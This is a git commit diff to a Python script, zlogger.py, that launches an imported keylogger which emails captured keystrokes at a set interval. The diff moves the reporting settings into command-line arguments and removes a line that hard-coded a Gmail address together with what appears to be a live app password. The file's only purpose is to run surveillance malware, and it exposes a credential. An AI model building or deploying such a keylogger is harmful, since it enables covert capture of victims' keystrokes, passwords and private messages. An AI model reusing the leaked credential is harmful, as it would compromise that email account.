9eaf7fe9ffac17f5d180b1e117a69bbd686001c3
fixit-py <142362996+fixit-py@users.noreply.github.com>
2023-08-31 05:15:42 -0400

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,6 +1,19 @@
 #!/usr/bin/python
 
 import Keylogger
+import argparse
 
-my_keylogger = Keylogger.Keylogger( 30, "emmanueladeyehun@gmail.com", "wbduxhclzkrbgtcg", )
-my_keylogger.start()
+def main():
+    parser = argparse.ArgumentParser ( description="Keylogger with email reporting" )
+    parser.add_argument ( "-t", "--time_interval", type=int, default=30, help="Time interval in seconds" )
+    parser.add_argument ( "-e", "--email", default="your_email@gmail.com", required=True, help="Your email address" )
+    parser.add_argument ( "-p", "--password",default="your_password", required=True, help="Your email password" )
+
+    args = parser.parse_args ()
+
+    my_keylogger = Keylogger.Keylogger( args.time_interval, args.email, args.password )
+    my_keylogger.start ()
+
+
+if __name__ == "__main__":
+    main ()
